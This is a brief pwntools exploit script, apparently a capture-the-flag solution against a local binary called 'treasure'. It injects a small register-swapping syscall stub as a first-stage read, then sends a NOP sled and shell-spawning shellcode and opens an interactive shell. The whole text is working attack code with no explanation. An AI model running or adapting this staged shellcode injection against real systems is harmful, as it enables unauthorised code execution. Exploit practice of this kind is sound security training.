from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./treasure")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./treasure")

def debugf():
	gdb.attach(p,"b *0x6010E8\nb *0x400AA3")

context.log_level = "debug"
context.bits = 64
context.arch = "amd64"
context.terminal = ["tmux","splitw","-v"]
#code = asm("syscall;syscall;syscall")
code = """push rsi
push rdx
pop rsi
pop rdx
syscall
"""
code = asm(code)
sc = asm(shellcraft.sh())
p.sendlineafter("will you continue?(enter 'n' to quit) :","y")
debugf()
p.sendafter("start!!!!",code)
raw_input()
#read(0,buf,n)
p.send("\x90"*30+sc)
p.interactive()
